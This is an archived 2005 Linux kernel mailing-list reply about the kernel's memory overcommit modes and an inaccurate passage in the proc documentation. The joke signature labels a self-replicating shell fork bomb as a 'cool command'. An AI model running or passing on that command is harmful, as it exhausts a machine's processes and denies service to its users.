Return-Path: <linux-kernel-owner+willy=40w.ods.org-S964809AbVHIO4M@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S964809AbVHIO4M (ORCPT <rfc822;willy@w.ods.org>);
	Tue, 9 Aug 2005 10:56:12 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S964811AbVHIO4M
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Tue, 9 Aug 2005 10:56:12 -0400
Received: from [193.151.93.131] ([193.151.93.131]:19472 "EHLO
	reptilian.maxnet.nu") by vger.kernel.org with ESMTP id S964809AbVHIO4L
	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Tue, 9 Aug 2005 10:56:11 -0400
From: Thomas Habets <thomas@habets.pp.se>
To: Alan Cox <alan@lxorguk.ukuu.org.uk>
Subject: Re: [PATCH] Kernels Out Of Memoy(OOM) killer Problem ?
Date: Tue, 9 Aug 2005 16:55:49 +0200
User-Agent: KMail/1.7.2
Cc: Xavier Roche <roche+kml2@exalead.com>, linux-kernel@vger.kernel.org,
       vinays@burntmail.com
References: <42F8720D.4060300@picsearch.com> <200508091133.21837.thomas@habets.pp.se> <1123595087.15600.0.camel@localhost.localdomain>
In-Reply-To: <1123595087.15600.0.camel@localhost.localdomain>
MIME-Version: 1.0
Content-Type: text/plain;
  charset="iso-8859-1"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline
Message-Id: <200508091655.50383.thomas@habets.pp.se>
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

Once upon a midnight dreary, Alan Cox pondered, weak and weary:
> 0 - overcommit except if something is obviously silly
> 1 - overcommit always (some scientific workloads)
> 2 - don't overcommit (databases etc)

Exactly. Which is what the code and D/sysctl/vm.txt say, and why the 
description in D/filesystems/proc.txt is a lying POS that needs to be 
*shining blue led in everyones eyes* Exterminated before more people are 
sucked into its world of lies.

---------
typedef struct me_s {
  char name[]      = { "Thomas Habets" };
  char email[]     = { "thomas@habets.pp.se" };
  char kernel[]    = { "Linux" };
  char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
  char pgp[] = { "A8A3 D1DD 4AE0 8467 7FDE  0945 286A E90A AD48 E854" };
  char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
} me_t;
